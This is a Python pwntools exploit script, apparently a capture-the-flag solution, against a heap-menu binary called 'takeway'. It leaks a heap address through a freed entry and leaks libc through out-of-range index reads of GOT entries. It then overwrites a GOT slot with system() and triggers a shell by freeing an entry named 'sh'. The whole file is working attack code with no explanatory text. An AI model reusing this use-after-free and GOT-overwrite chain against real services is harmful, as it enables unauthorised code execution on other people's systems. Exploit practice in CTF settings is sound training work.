from pwn import *
from LibcSearcher import *
import binascii
context(os='linux', arch='amd64', log_level='debug')

sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		gdb.attach(p,x)
		pause()
p=process('./takeway')
elf=ELF('./takeway')
# p=remote()
def choose(type):
	sla(b'choose: ',type)

def add(index,name,remake):
    choose(b'1')
    sla(b'index\n',str(index).encode())
    sa(b'name: ',name)
    sa(b'remark: ',remake)
def delete(index):
    choose(b'2')
    sla(b'index: ',str(index).encode())
def modify(index,content):
    choose(b'3')
    sla(b'index: ',str(index).encode())
    ru(b'order is: ')
    order=ru(b'\n')[:-1]
    sa(b'is: ',content)
    return order
def modify2(index):
    choose(b'3')
    sla(b'index: ',str(index).encode())
    ru(b'order is: ')
    order=ru(b'\n')[:-1]
    return order
def getbias(heapaddr,address):
	return (address-heapaddr)//8
add(0,b'aaaa',b'bbbb')
add(1,b'cccc',b'dddd')
delete(0)
# malloc_bias=getbias(malloc_got)
# print('malloc_bias',malloc_bias)
order=modify(0,b'aaaa')
heapaddr=uu64(order)
heapaddr-=0x1fbc010-0x0000000001fbc2a0
print('heapaddr',hex(heapaddr))


setresgid_got=elf.got['setresgid']
printf_got=elf.got['printf']
read_got=elf.got['read']
puts_got=elf.got['puts']

add(2,p64(puts_got-8),p64(puts_got-8))
add(3,p64(printf_got-8),p64(printf_got-8))
# add(4,p64(read_got-8),p64(read_got-8))
# gdba()
order=modify(532,b'cccc')
printf_addr=uu64(order)
print('printf_addr',hex(printf_addr))

order=modify2(520)
puts_addr=uu64(order)
print('puts_addr',hex(puts_addr))


# printf_got=elf.got['printf']
# order=modify(532,b'cccc')
# printf_addr=uu64(order)
# print('printf_addr',hex(printf_addr))

# order=modify(538,b'cccc')
# read_addr=uu64(order)
# print('read_addr',hex(read_addr))

libc=LibcSearcher('puts',puts_addr)
libc.add_condition('printf',printf_addr)
# libc.add_condition('setresgid',setresgid_got)
libc_base=puts_addr-libc.dump('puts')
print('libc_base',hex(libc_base))
system_addr=libc_base+libc.dump('system')

sa(b'is: ',p64(system_addr))


# gdba()
add(4,'sh\x00','sh\x00')
delete(4)
ita()
